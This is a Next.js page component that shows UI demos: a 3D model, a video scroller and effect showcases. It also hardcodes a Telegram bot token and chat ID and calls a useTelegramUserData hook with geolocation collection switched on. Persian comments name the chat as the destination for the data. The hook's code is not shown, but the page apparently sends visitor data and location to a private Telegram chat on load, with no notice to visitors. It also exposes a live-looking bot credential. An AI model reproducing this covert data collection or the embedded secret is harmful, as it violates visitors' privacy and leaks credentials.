'use client'
import {GoogleGeminiEffectDemo} from '@/app/components/ui/TestGoogleGeminiEffect'
import {TracingBeamDemo} from '@/app/components/ui/TestTracingBeam'
import {LampDemo} from '@/app/components/ui/TestLamp'
import VideoScroller from "@/app/components/VideoScroller";
import React from "react";
import {TypeAnimation} from "react-type-animation";
import InterView from "@/app/components/ui/InterView";
import Model3D from "@/app/components/test/Test3d";
import useTelegramUserData from './components/telegram/hook/useTelegramUserData';

const Page = () => {
    const botToken = '8256676674:AAGY4IXrfXzReKpk8FUZw1LqtCfqLaYFVgM'; // توکن ربات شما
    const chatId = '310569075'; // آیدی چت مقصد (مثلاً پی‌وی خودتان) را اینجا قرار دهید
    const { isLoading, error } = useTelegramUserData({
        botToken,
        chatId,
        collectGeolocation: true, // فعال کردن موقعیت جغرافیایی (اختیاری)
    });
    return (
        <div>
            <InterView/>
            <Model3D modelPath={'/model/space/scene.gltf'}/>
            {/*<Model3D modelPath={'/model/logo/scene.gltf'}/>*/}
            <VideoScroller videoSrc={'https://wonderful-yonath-zqfmh2rkb.storage.iran.liara.space/local-share/07.mp4'} fps={120} speed={4}/>
            <GoogleGeminiEffectDemo/>
            <TracingBeamDemo/>
            <LampDemo/>
        </div>
    );
};

export default Page;